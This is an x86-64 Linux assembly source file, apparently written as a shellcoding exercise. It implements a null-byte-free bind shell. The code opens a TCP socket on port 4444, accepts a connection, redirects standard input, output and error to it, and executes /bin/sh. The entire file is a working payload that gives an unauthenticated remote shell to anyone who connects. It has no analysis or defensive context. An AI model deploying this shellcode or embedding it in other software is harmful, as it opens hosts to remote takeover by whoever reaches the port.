global _start

section .text

_start:
    ; RAX - syscall number
    ; RDI - 1st arg
    ; RSI - 2nd arg
    ; RDX - 3rd arg
    ; R10
    ; R8
    ; R9

    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx
    xor r10, r10
    xor r8,r8
    xor r9,r9


    ;  // sycall socketcall (sys_socket 1)
    ; sockfd = socket(AF_INET, SOCK_STREAM, 0);
    ; socket.AF_INET == 2
    ; socket.SOCK_STREAM == 1
    mov al, 41
    mov dil, 2
    mov sil, 1
    syscall

    mov rdi, rax ; store returned sockfd value to rdi


    ; // set struct values
    ; my_addr.sin_family = AF_INET; // 2
    ; my_addr.sin_port = htons(port); // port number
    ; my_addr.sin_addr.s_addr = INADDR_ANY; // 0 fill with the local IP
    xor rax, rax
    push rax
    mov dword [rsp-4], eax; INADDR_ANY == 0
    mov word [rsp-6], 0x5c11; hex(socket.htons(4444))
    ; below is done this way because mov word [rsp-8], 2 had a null byte in it
    ; mov word [rsp-8], 2
    xor r9, r9
    mov byte [rsp-7], r9b
    mov byte [rsp-8], 2; AF_INET == 2
    sub rsp, 8

    ; syscall 49
    ; bind(sockfd, (struct sockaddr *) &my_addr, sizeof(my_addr));
    xor rax, rax
    mov al, 49
    mov rsi, rsp
    xor rdx, rdx
    mov dl, 16
    syscall

    ; syscall 50
    ; listen(sockfd, 2);
    xor rax, rax
    mov al, 50
    xor rsi, rsi
    mov sil, 2
    syscall

    ; syscall 43
    ; resultfd = accept(sockfd, NULL, NULL);

    xor rax, rax
    mov al, 43
    sub rsp, 16 ; free up 16 bytes on stack to represent NULL sockaddr objects 
    mov rsi, rsp
    mov byte [rsp-1], 16
    sub rsp, 1
    mov rdx, rsp
    syscall

    mov r14, rax  ; store resultfd in r14

    ; close parent socket
    xor rax, rax
    mov al, 3
    syscall

    ; // syscall 33
    ; dup2(resultfd, 2);
    ; dup2(resultfd, 1);
    ; dup2(resultfd, 0);
    xor rax, rax
    mov al, 33
    mov rdi, r14
    xor rsi, rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall
    xor rax, rax
    mov al, 33
    inc rsi
    syscall

    ; // syscall 59
    ; execve("/bin/sh", NULL, NULL);
    xor rax, rax
    mov al, 59
    xor rbx,rbx
    push rbx
    mov  rcx, 0x68732f2f6e69622f ; "/bin//sh"[::-1].encode('hex')
    push rcx
    mov rdi, rsp

    push rbx
    mov rdx, rsp

    push rdi
    mov rsi, rsp
    syscall